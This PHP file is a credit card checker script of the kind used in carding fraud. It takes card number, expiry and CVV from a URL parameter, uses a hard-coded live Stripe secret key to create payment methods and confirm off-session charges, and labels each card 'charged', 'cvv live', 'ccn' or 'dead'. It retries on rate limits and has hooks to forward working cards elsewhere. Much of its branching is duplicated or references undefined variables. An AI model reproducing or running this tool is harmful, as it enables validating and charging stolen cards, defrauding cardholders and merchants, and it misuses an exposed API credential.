<?php






error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
    $idd = $_GET['idd'];
    $amt = $_GET['cst'];
    if (empty($amt)) {
        $amt = '1';
    }
    $chr = $amt * 100;
$sk = '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';

$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";





//================= [ CURL REQUESTS ] =================//



#-------------------[1st REQ]--------------------#
$x = 0;  

while(true)  

{  

$ch = curl_init();  

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  

curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  

curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');  

$result1 = curl_exec($ch);  

$tok1 = Getstr($result1,'"id": "','"');  

$msg = Getstr($result1,'"message": "','"');  

//echo "<br><b>Result1: </b> $result1<br>";  

if (strpos($result1, "rate_limit"))   

{  

    $x++;  

    continue;  

}  

break;  

}
#-------------------[2nd REQ]--------------------#

$x = 0;  

while(true)  

{  

$ch = curl_init();  

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  

curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  

curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  

curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=FanastyTooGood&payment_method='.$tok1.'&confirm=true&off_session=true');  

$result2 = curl_exec($ch);  

$tok2 = Getstr($result2,'"id": "','"');  

$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  

//echo "<br><b>Result2: </b> $result2<br>";  

if (strpos($result2, "rate_limit"))   

{  

    $x++;  

    continue;  

}  

break;  

}



//=================== [ RESPONSES ] ===================//

if(strpos($result2, '"seller_message": "payment complete."' )) {
    echo 'charged</span>  </span>cc:  '.$lista.'</span>  <br>➤ response: $'.$amt.' ccn charged  <br> ➤ receipt : <a href='.$receipturl.'>here</a><br>';
}
elseif(strpos($result2,'"cvc_check": "pass"')){
    file_get_contents($forwardcvv);
    echo 'cvv</span>  </span>cc:  '.$lista.'</span>  <br>-> result: cvv live</span><br>';
}


elseif(strpos($result1, "generic_decline")) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: generic declined  </span><br>';
    }
elseif(strpos($result2, "generic_decline" )) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: generic declined </span><br>';
}
elseif(strpos($result2, "insufficient_funds" )) {
    file_get_contents($forwardcvv);
    echo 'cvv</span>  </span>cc:  '.$lista.'</span>  <br>-> result: insufficient funds</span><br>';
}

elseif(strpos($result2, "fraudulent" )) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: fraudulent</span><br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: do not honor</span><br>';
    }
elseif(strpos($resul2, "do_not_honor" )) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: do not honor</span><br>';
}
elseif(strpos($result,"fraudulent")){
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: fraudulent</span><br>';

}

elseif(strpos($result2,'"code": "incorrect_cvc"')){
    file_get_contents($forwardccn);
    echo 'ccn</span>  </span>cc:  '.$lista.'</span>  <br>-> result: security code is incorrect</span><br>';
}
elseif(strpos($result1,' "code": "invalid_cvc"')){
    file_get_contents($forwardccn);
    echo 'ccn</span>  </span>cc:  '.$lista.'</span>  <br>-> result: security code is incorrect</span><br>';
     
}
elseif(strpos($result1,"invalid_expiry_month")){
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: invaild expiry month</span><br>';

}
elseif(strpos($result2,"invalid_account")){
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: invaild account</span><br>';

}

elseif(strpos($result2, "do_not_honor")) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: do not honor</span><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: lost card</span><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: lost card</span></span>  <br>-> result: checker by checker</span> <br>';
}

elseif(strpos($result2, "stolen_card" )) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: stolen card</span><br>';
    }

elseif(strpos($result2, "stolen_card" )) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: stolen card</span><br>';


}
elseif(strpos($result2, "transaction_not_allowed" )) {
    file_get_contents($forwardcvv);
    echo 'cvv</span>  </span>cc:  '.$lista.'</span>  <br>-> result: transaction not allowed</span><br>';
    }
    elseif(strpos($result2, "authentication_required")) {
    file_get_contents($forwardcvv);
    echo 'cvv</span>  </span>cc:  '.$lista.'</span>  <br>-> result: 32ds required</span><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    file_get_contents($forwardcvv);
    echo 'cvv</span>  </span>cc:  '.$lista.'</span>  <br>-> result: 32ds required</span><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    file_get_contents($forwardcvv);
    echo 'cvv</span>  </span>cc:  '.$lista.'</span>  <br>-> result: 32ds required</span><br>';
   } 
   elseif(strpos($result1, "card_error_authentication_required")) {
    file_get_contents($forwardcvv);
    echo 'cvv</span>  </span>cc:  '.$lista.'</span>  <br>-> result: 32ds required</span><br>';
   } 
elseif(strpos($result2, "incorrect_cvc" )) {
    file_get_contents($forwardcvv);
    echo 'cvv</span>  </span>cc:  '.$lista.'</span>  <br>-> result: security code is incorrect</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: pickup card</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: pickup card</span><br>';

}
elseif(strpos($result2, 'your card has expired.')) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: expired card</span><br>';
}
elseif(strpos($result2, 'your card has expired.')) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: expired card</span><br>';

}
elseif(strpos($result2, "card_decline_rate_limit_exceeded")) {
	echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: sk is at rate limit</span><br>';
}
elseif(strpos($result2, '"code": "processing_error"')) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: processing error</span><br>';
    }
elseif(strpos($result2, ' "message": "your card number is incorrect."')) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: your card number is incorrect</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: service not allowed</span><br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: processing error</span><br>';
    }
elseif(strpos($result2, ' "message": "your card number is incorrect."')) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: your card number is incorrect</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: service not allowed</span><br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: incorrect card number</span><br>';
}
elseif(strpos($result1, "incorrect_number")) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: incorrect card number</span><br>';


}elseif(strpos($result1, "do_not_honor")) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: do not honor</span><br>';

}
elseif(strpos($result1, 'your card was declined.')) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: card declined</span><br>';

}
elseif(strpos($result1, "do_not_honor")) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: do not honor</span><br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: generic card</span><br>';
}
elseif(strpos($result, 'your card was declined.')) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: card declined</span><br>';

}
elseif(strpos($result2,' "decline_code": "do_not_honor"')){
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: do not honor</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: cvc_unchecked : inform at owner</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: cvc_check : fail</span><br>';
}
elseif(strpos($result2, "card_not_supported")) {
	echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: card not supported</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: cvc_check : unvailable</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: cvc_unchecked : inform to owner」</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: cvc_checked : fail</span><br>';
}
elseif(strpos($result2,"currency_not_supported")) {
	echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: currency not suported try in inr</span><br>';
}

elseif (strpos($result,'your card does not support this type of purchase.')) {
    echo 'dead</span> cc:  '.$lista.'</span>  <br>-> result: card not support this type of purchase</span><br>';
    }

elseif(strpos($result2,'"cvc_check": "pass"')){
    file_get_contents($forwardcvv);
    echo 'cvv</span>  </span>cc:  '.$lista.'</span>  <br>-> result: cvv live</span><br>';
}
elseif(strpos($result2, "fraudulent" )) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: fraudulent</span><br>';
}
elseif(strpos($result1, "testmode_charges_only" )) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: sk key dead or invalid</span><br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: sk key revoked</span><br>';
}
elseif(strpos($result1, "parameter_invalid_empty" )) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: enter cc to check</span><br>';
}
elseif(strpos($result1, "card_not_supported" )) {
    echo 'dead</span>  </span>cc:  '.$lista.'</span>  <br>-> result: card not supported</span><br>';
}
else {
    echo 'dead</span> cc:  '.$lista.'</span>  <br>-> result: increase amount or try another card '.$chr.'</span><br>';
   
   
      
}




//echo "<br><b>Lista:</b> $lista<br>";
//echo "<br><b>CVV Check:</b> $cvccheck<br>";
//echo "<b>D_Code:</b> $dcode<br>";
//echo "<b>Reason:</b> $reason<br>";
//echo "<b>Risk Level:</b> $riskl<br>";
//echo "<b>Seller Message:</b> $seller_msg<br>";

echo " Bypassing: $x <br>";

//echo "<br><b>Result3: </b> $result2<br>";

curl_close($ch);
ob_flush();
?>